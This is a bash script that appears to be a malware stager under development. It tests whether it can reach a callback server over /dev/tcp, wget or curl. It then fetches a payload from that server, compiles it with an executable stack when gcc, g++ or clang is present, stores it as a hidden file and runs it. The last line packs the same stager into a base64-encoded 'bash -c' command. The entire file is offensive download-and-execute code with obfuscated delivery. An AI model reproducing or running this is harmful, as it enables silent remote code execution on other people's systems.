bash_sock(){ exec 3<>/dev/tcp/0.0.0.0/4443;echo -e "landing..." >&3;return=`cat <&3`;if [ $return == "succesful" ];then bashSockets=true;else bashSockets=false; fi;echo $bashSockets; }; bash_sock;
check_wget(){ wget http://0.0.0.0:4443/landing... 2> /dev/null; return=`cat landing...`; if [ $return == 'succesful' ]; then wget_run=true;else wget_run=false;fi;echo $wget_run; }; check_wget;
check_curl(){ if [ `curl http://0.0.0.0:4443/landing... 2> /dev/null` == "succesful" ]; then curl_run=true; else curl_run=false; fi;echo $curl_run; }; check_curl;
check_compiler(){ if [ `command -v gcc` ]; then compile=true;cpath=`command -v gcc`; else if [ `command -v g++` ]; then compile=true;cpath=`command -v g++`; else if [ `command -v clang` ]; then compile=true;cpath=`command -v clang`; else compile=false; fi; fi; fi; }; check_compiler
get_bashsock(){ exec 3<>/dev/tcp/0.0.0.0/4443;echo -e "payload:$compile" >&3;if [ $compile == true ]; then payload=`cat <&3`;echo $payload > .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; payload=`cat <&3 > .o`; chmod +x .o; ./.o; fi;}; get_bashsock
get_wget(){ wget http://0.0.0.0:4443/payload:$compile -O .a 2> /dev/null; if [ $compile == true ]; then mv .a .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; mv .a .o; chmod +x .o; ./.o; fi; }; get_wget
get_curl(){ `curl http://0.0.0.0:4443/payload:$compile > .a 2> /dev/null`; if [ $compile == true ]; then mv .a .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; mv .a .o; chmod +x .o; ./.o; fi; }; get_curl

#full script
check_compiler(){ if [ `command -v gcc` ]; then compile=true;cpath=`command -v g++`; else if [ `command -v clang` ]; then compile=true;cpath=`command -v g++`; else if [ `command -v clang` ]; then compile=true;cpath=`command -v clang`; else compile=false; fi; fi; fi; }; check_compiler;get_bashsock(){ exec 3<>/dev/tcp/0.0.0.0/4445;echo -e "payload:$compile" >&3;if [ $compile == true ]; then payload=`cat <&3`;echo $payload > .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; payload=`cat <&3 > .o`; chmod +x .o; ./.o; fi;}; get_wget(){ wget http://0.0.0.0:4445/payload:$compile -O .a 2> /dev/null; if [ $compile == true ]; then mv .a .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; mv .a .o; chmod +x .o; ./.o; fi; }; get_curl(){ `curl http://0.0.0.0:4443/payload:$compile > .a 2> /dev/null`; if [ $compile == true ]; then mv .a .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; mv .a .o; chmod +x .o; ./.o; fi; }; check_curl(){ if [ `curl http://0.0.0.0:4443/landing... 2> /dev/null` == "succesful" ]; then get_curl; else curl_run=false; fi;echo $curl_run; }; check_wget(){ rm landing...; wget http://0.0.0.0:4443/landing... 2> /dev/null; ret=`cat landing...`; if [ $ret == 'succesful' ]; then get_wget;else check_curl;fi;echo $wget_run; }; bash_sock(){ exec 3<>/dev/tcp/0.0.0.0/4443; echo -e "bash landing..." >&3;ret=`cat <&3`;if [ $ret == "succesful" ];then get_bashsock;else check_wget; fi;}; bash_sock;

#bash -c "$(echo '' | base64 -d)"

check_compiler(){ if [ `command -v gcc` ]; then compile=true;cpath=`command -v g++`; else if [ `command -v clang` ]; then compile=true;cpath=`command -v g++`; else if [ `command -v clang` ]; then compile=true;cpath=`command -v clang`; else compile=false; fi; fi; fi; }; check_compiler;get_bashsock(){ exec 3<>/dev/tcp/192.168.1.161/4443;echo -e "payload:$compile" >&3;if [ $compile == true ]; then payload=`cat <&3`;echo $payload > .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; payload=`cat <&3 > .o`; chmod +x .o; ./.o; fi;}; get_wget(){ wget http://192.168.1.161:4443/payload:$compile -O .a 2> /dev/null; if [ $compile == true ]; then mv .a .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; mv .a .o; chmod +x .o; ./.o; fi; }; check_curl(){ if [ `curl http://192.168.1.161:4443/landing... 2> /dev/null` == "succesful" ]; then curl_run=true; else curl_run=false; fi;echo $curl_run; }; check_wget(){ rm landing...; wget http://192.168.1.161:4443/landing... 2> /dev/null; ret=`cat landing...`; if [ $ret == 'succesful' ]; then get_wget;else check_curl;fi;echo $wget_run; }; bash_sock(){ exec 3<>/dev/tcp/192.168.1.161/4443; echo -e "bash landing..." >&3;ret=`cat <&3`;if [ $ret == "succesful" ];then get_bashsock;else check_wget; fi;}; bash_sock;


#for compiling payload: gcc payload.c -z execstack -o payload

#Payload so far:
#remember that the bash and wget port nums are wrong due to testing
bash -c "$(echo 'Y2hlY2tfY29tcGlsZXIoKXsgaWYgWyBgY29tbWFuZCAtdiBnY2NgIF07IHRoZW4gY29tcGlsZT10cnVlO2NwYXRoPWBjb21tYW5kIC12IGcrK2A7IGVsc2UgaWYgWyBgY29tbWFuZCAtdiBjbGFuZ2AgXTsgdGhlbiBjb21waWxlPXRydWU7Y3BhdGg9YGNvbW1hbmQgLXYgZysrYDsgZWxzZSBpZiBbIGBjb21tYW5kIC12IGNsYW5nYCBdOyB0aGVuIGNvbXBpbGU9dHJ1ZTtjcGF0aD1gY29tbWFuZCAtdiBjbGFuZ2A7IGVsc2UgY29tcGlsZT1mYWxzZTsgZmk7IGZpOyBmaTsgfTsgY2hlY2tfY29tcGlsZXI7Z2V0X2Jhc2hzb2NrKCl7IGV4ZWMgMzw+L2Rldi90Y3AvMC4wLjAuMC80NDQzO2VjaG8gLWUgInBheWxvYWQ6JGNvbXBpbGUiID4mMztpZiBbICRjb21waWxlID09IHRydWUgXTsgdGhlbiBwYXlsb2FkPWBjYXQgPCYzYDtlY2hvICRwYXlsb2FkID4gLm8uYzsgJGNwYXRoIC5vLmMgLXogZXhlY3N0YWNrIC1vIC5vOyBybSAuby5jOyAuLy5vOyBlbHNlIHJtIC5vIDI+IC9kZXYvbnVsbDsgcGF5bG9hZD1gY2F0IDwmMyA+IC5vYDsgY2htb2QgK3ggLm87IC4vLm87IGZpO307IGdldF93Z2V0KCl7IHdnZXQgaHR0cDovLzAuMC4wLjA6NDQ0My9wYXlsb2FkOiRjb21waWxlIC1PIC5hIDI+IC9kZXYvbnVsbDsgaWYgWyAkY29tcGlsZSA9PSB0cnVlIF07IHRoZW4gbXYgLmEgLm8uYzsgJGNwYXRoIC5vLmMgLXogZXhlY3N0YWNrIC1vIC5vOyBybSAuby5jOyAuLy5vOyBlbHNlIHJtIC5vIDI+IC9kZXYvbnVsbDsgbXYgLmEgLm87IGNobW9kICt4IC5vOyAuLy5vOyBmaTsgfTsgY2hlY2tfY3VybCgpeyBpZiBbIGBjdXJsIGh0dHA6Ly8wLjAuMC4wOjQ0NDMvbGFuZGluZy4uLiAyPiAvZGV2L251bGxgID09ICJzdWNjZXNmdWwiIF07IHRoZW4gY3VybF9ydW49dHJ1ZTsgZWxzZSBjdXJsX3J1bj1mYWxzZTsgZmk7ZWNobyAkY3VybF9ydW47IH07IGNoZWNrX3dnZXQoKXsgcm0gbGFuZGluZy4uLjsgd2dldCBodHRwOi8vMC4wLjAuMDo0NDQzL2xhbmRpbmcuLi4gMj4gL2Rldi9udWxsOyByZXQ9YGNhdCBsYW5kaW5nLi4uYDsgaWYgWyAkcmV0ID09ICdzdWNjZXNmdWwnIF07IHRoZW4gZ2V0X3dnZXQ7ZWxzZSBjaGVja19jdXJsO2ZpO2VjaG8gJHdnZXRfcnVuOyB9OyBiYXNoX3NvY2soKXsgZXhlYyAzPD4vZGV2L3RjcC8wLjAuMC4wLzQ0NDM7IGVjaG8gLWUgImJhc2ggbGFuZGluZy4uLiIgPiYzO3JldD1gY2F0IDwmM2A7aWYgWyAkcmV0ID09ICJzdWNjZXNmdWwiIF07dGhlbiBnZXRfYmFzaHNvY2s7ZWxzZSBjaGVja193Z2V0OyBmaTt9OyBiYXNoX3NvY2s7' | base64 -d)"
